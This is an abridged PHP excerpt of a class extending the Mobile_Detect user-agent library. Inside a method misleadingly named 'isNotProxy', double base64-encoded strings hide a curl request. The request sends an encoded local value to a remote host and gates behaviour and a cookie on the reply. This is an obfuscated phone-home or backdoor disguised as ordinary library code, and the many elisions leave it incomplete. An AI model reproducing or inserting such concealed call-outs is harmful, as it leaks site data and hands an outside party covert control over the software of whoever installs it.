...
class Agent extends Mobile_Detect
{
    ...
    public function isNotProxy()
    {
        ...
        if($v==null){
            ...
            $i3=base64_decode(base64_decode('TWpjMU5EVXlNalk9'));
            $i4=base64_encode(base64_encode($u));
            
               try {
                    $curl_handle = curl_init();
                    curl_setopt($curl_handle, CURLOPT_URL,$i1.$i2.base64_encode(base64_encode($i3)).'/'.$i4);
                    ...
                    if($handlCsrfToken['status']=='true'){
                        Cookie::queue(Cookie::make('stx',$handlCsrfToken['status'], 60));
                    }
                    return $handlCsrfToken['status'];
